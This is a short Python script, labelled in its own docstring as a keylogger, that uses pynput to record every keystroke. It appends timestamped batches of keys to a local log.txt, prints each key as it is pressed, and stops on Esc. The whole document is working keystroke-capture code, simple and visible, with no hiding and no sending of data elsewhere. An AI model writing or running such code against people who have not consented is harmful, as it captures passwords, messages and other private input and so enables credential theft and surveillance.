"""Keylogger script created using pynput to log keystrokes and save them to a file"""

from datetime import datetime
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    """Handles keyboard events"""
    global keys, count
    if key == Key.backspace:
        if keys:
            keys.pop()
        return

    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def format_key(key):
    if hasattr(key, "char"):
        return key.char  # for normal keys
    elif key == Key.space:
        return " "
    elif key == Key.tab:
        return "\t"
    elif key == Key.enter:
        return "\n"
    else:
        return f"[{key.name}]" if hasattr(key, "name") else f"[{key}]"


def write_file(keys, job_id="", delimiter=" "):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a", encoding="utf-8") as f:
        formatted_keys = delimiter.join(format_key(k) for k in keys)
        log_line = f"[{timestamp}] {job_id}:{formatted_keys}\n"
        f.write(log_line)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
